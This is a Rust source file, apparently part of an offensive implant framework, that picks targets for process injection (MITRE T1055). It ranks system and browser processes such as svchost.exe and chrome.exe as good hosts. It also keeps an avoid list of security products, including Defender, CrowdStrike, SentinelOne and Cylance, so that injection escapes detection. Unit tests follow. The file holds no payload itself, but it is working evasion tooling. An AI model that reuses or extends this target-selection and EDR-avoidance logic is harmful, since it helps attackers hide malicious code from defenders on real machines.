//! Target Process Selection
//!
//! Helpers for selecting injection targets with OPSEC considerations.
//!
//! MITRE ATT&CK: T1055 (Process Injection)
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY

use serde::{Deserialize, Serialize};

/// Process selection criteria
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
pub enum ProcessSelectionCriteria {
    /// Long-running system process
    #[default]
    SystemProcess,
    /// Browser processes (common, high network)
    BrowserProcess,
    /// Signed Microsoft binary
    SignedMicrosoft,
    /// Any suitable process
    Any,
    /// Specific process by name
    ByName,
}

/// Target process information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetProcess {
    pub pid: u32,
    pub name: String,
    pub path: Option<String>,
    pub is_64bit: bool,
    pub integrity_level: IntegrityLevel,
    pub injection_suitability: u8, // 1-10
}

/// Process integrity level
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
pub enum IntegrityLevel {
    Untrusted,
    Low,
    #[default]
    Medium,
    High,
    System,
    Unknown,
}

/// Known good injection targets
pub struct InjectionTargets;

impl InjectionTargets {
    /// System processes suitable for injection
    pub fn system_processes() -> &'static [&'static str] {
        &[
            "svchost.exe",       // Service host - very common
            "RuntimeBroker.exe", // Runtime broker
            "sihost.exe",        // Shell infrastructure host
            "taskhostw.exe",     // Task host
            "explorer.exe",      // Windows Explorer
            "dllhost.exe",       // COM surrogate
            "WmiPrvSE.exe",      // WMI Provider
        ]
    }

    /// Browser processes
    pub fn browser_processes() -> &'static [&'static str] {
        &[
            "chrome.exe",
            "firefox.exe",
            "msedge.exe",
            "iexplore.exe",
            "brave.exe",
            "opera.exe",
        ]
    }

    /// Processes to avoid (security tools, critical)
    pub fn avoid_processes() -> &'static [&'static str] {
        &[
            // Security tools
            "MsMpEng.exe",
            "csfalconservice.exe",
            "cb.exe",
            "SentinelAgent.exe",
            "CylanceSvc.exe",
            // Critical system
            "lsass.exe",
            "csrss.exe",
            "smss.exe",
            "wininit.exe",
            "services.exe",
            "winlogon.exe",
            // AV/EDR
            "avp.exe",
            "avgui.exe",
            "ekrn.exe",
        ]
    }

    /// Get suitability score for a process
    pub fn get_suitability(process_name: &str) -> u8 {
        let name_lower = process_name.to_lowercase();

        // Avoid list = 0
        if Self::avoid_processes()
            .iter()
            .any(|p| p.to_lowercase() == name_lower)
        {
            return 0;
        }

        // Browser = 8 (common, high network activity)
        if Self::browser_processes()
            .iter()
            .any(|p| p.to_lowercase() == name_lower)
        {
            return 8;
        }

        // System processes = 7
        if Self::system_processes()
            .iter()
            .any(|p| p.to_lowercase() == name_lower)
        {
            return 7;
        }

        // Default
        5
    }
}

/// Target Process Finder
#[derive(Debug, Default)]
pub struct ProcessFinder {
    criteria: ProcessSelectionCriteria,
    target_name: Option<String>,
    require_64bit: bool,
    min_integrity: IntegrityLevel,
}

impl ProcessFinder {
    pub fn new() -> Self {
        Self {
            criteria: ProcessSelectionCriteria::SystemProcess,
            target_name: None,
            require_64bit: true,
            min_integrity: IntegrityLevel::Medium,
        }
    }

    /// Set selection criteria
    pub fn with_criteria(mut self, criteria: ProcessSelectionCriteria) -> Self {
        self.criteria = criteria;
        self
    }

    /// Set specific target name
    pub fn with_name(mut self, name: &str) -> Self {
        self.target_name = Some(name.to_string());
        self.criteria = ProcessSelectionCriteria::ByName;
        self
    }

    /// Require 64-bit process
    pub fn require_64bit(mut self, require: bool) -> Self {
        self.require_64bit = require;
        self
    }

    /// Find suitable target process
    pub fn find(&self) -> Option<TargetProcess> {
        let processes = self.enumerate_processes();

        // Filter based on criteria
        let candidates: Vec<_> = processes
            .into_iter()
            .filter(|p| {
                // Check architecture
                if self.require_64bit && !p.is_64bit {
                    return false;
                }

                // Check suitability
                if p.injection_suitability == 0 {
                    return false;
                }

                // Check specific name if requested
                if self
                    .target_name
                    .as_ref()
                    .is_some_and(|name| !p.name.to_lowercase().contains(&name.to_lowercase()))
                {
                    return false;
                }

                // Check criteria
                match self.criteria {
                    ProcessSelectionCriteria::SystemProcess => InjectionTargets::system_processes()
                        .iter()
                        .any(|s| p.name.to_lowercase() == s.to_lowercase()),
                    ProcessSelectionCriteria::BrowserProcess => {
                        InjectionTargets::browser_processes()
                            .iter()
                            .any(|b| p.name.to_lowercase() == b.to_lowercase())
                    }
                    ProcessSelectionCriteria::ByName => true, // Already filtered above
                    _ => true,
                }
            })
            .collect();

        // Return highest suitability
        candidates
            .into_iter()
            .max_by_key(|p| p.injection_suitability)
    }

    /// Find multiple suitable targets
    pub fn find_all(&self, limit: usize) -> Vec<TargetProcess> {
        let processes = self.enumerate_processes();

        let mut candidates: Vec<_> = processes
            .into_iter()
            .filter(|p| p.injection_suitability > 0)
            .filter(|p| !self.require_64bit || p.is_64bit)
            .collect();

        candidates.sort_by(|a, b| b.injection_suitability.cmp(&a.injection_suitability));
        candidates.truncate(limit);
        candidates
    }

    /// Enumerate running processes
    fn enumerate_processes(&self) -> Vec<TargetProcess> {
        let mut processes = Vec::new();

        #[cfg(windows)]
        {
            use std::process::Command;

            // Use tasklist to get process info
            if let Ok(output) = Command::new("tasklist").args(["/FO", "CSV", "/NH"]).output() {
                let output_str = String::from_utf8_lossy(&output.stdout);

                for line in output_str.lines() {
                    let parts: Vec<_> = line.split(',').map(|s| s.trim_matches('"')).collect();

                    if parts.len() >= 2 {
                        let name = parts[0].to_string();
                        if let Ok(pid) = parts[1].parse::<u32>() {
                            processes.push(TargetProcess {
                                pid,
                                name: name.clone(),
                                path: None,
                                is_64bit: true, // Assume 64-bit on modern systems
                                integrity_level: IntegrityLevel::Unknown,
                                injection_suitability: InjectionTargets::get_suitability(&name),
                            });
                        }
                    }
                }
            }
        }

        #[cfg(not(windows))]
        {
            use std::process::Command;

            if let Ok(output) = Command::new("ps").args(["-eo", "pid,comm"]).output() {
                let output_str = String::from_utf8_lossy(&output.stdout);

                for line in output_str.lines().skip(1) {
                    let parts: Vec<_> = line.split_whitespace().collect();
                    if parts.len() >= 2 && parts[0].parse::<u32>().is_ok() {
                        let pid = parts[0].parse::<u32>().unwrap();
                        let name = parts[1].to_string();
                        processes.push(TargetProcess {
                            pid,
                            name,
                            path: None,
                            is_64bit: true,
                            integrity_level: IntegrityLevel::Unknown,
                            injection_suitability: 5,
                        });
                    }
                }
            }
        }

        processes
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_suitability_scores() {
        assert_eq!(InjectionTargets::get_suitability("svchost.exe"), 7);
        assert_eq!(InjectionTargets::get_suitability("chrome.exe"), 8);
        assert_eq!(InjectionTargets::get_suitability("lsass.exe"), 0);
    }

    #[test]
    fn test_process_finder_creation() {
        let finder = ProcessFinder::new()
            .with_criteria(ProcessSelectionCriteria::BrowserProcess)
            .require_64bit(true);

        assert_eq!(finder.criteria, ProcessSelectionCriteria::BrowserProcess);
    }

    #[test]
    fn test_enumerate_processes() {
        let finder = ProcessFinder::new();
        let processes = finder.enumerate_processes();
        // Should find at least some processes
        // (may be empty in restricted environments)
        let _ = processes;
    }

    #[test]
    fn test_system_processes_list() {
        let procs = InjectionTargets::system_processes();
        assert!(!procs.is_empty());
        assert!(procs.contains(&"svchost.exe"));
    }

    #[test]
    fn test_browser_processes_list() {
        let procs = InjectionTargets::browser_processes();
        assert!(!procs.is_empty());
        assert!(procs.contains(&"chrome.exe"));
    }

    #[test]
    fn test_avoid_processes_list() {
        let procs = InjectionTargets::avoid_processes();
        assert!(!procs.is_empty());
        assert!(procs.contains(&"lsass.exe"));
    }

    #[test]
    fn test_find_all_processes() {
        let finder = ProcessFinder::new().require_64bit(false);
        let processes = finder.find_all(5);
        // May or may not find processes depending on environment
        assert!(processes.len() <= 5);
    }

    #[test]
    fn test_process_selection_criteria_default() {
        let criteria = ProcessSelectionCriteria::default();
        assert_eq!(criteria, ProcessSelectionCriteria::SystemProcess);
    }

    #[test]
    fn test_integrity_level_default() {
        let level = IntegrityLevel::default();
        assert_eq!(level, IntegrityLevel::Medium);
    }
}
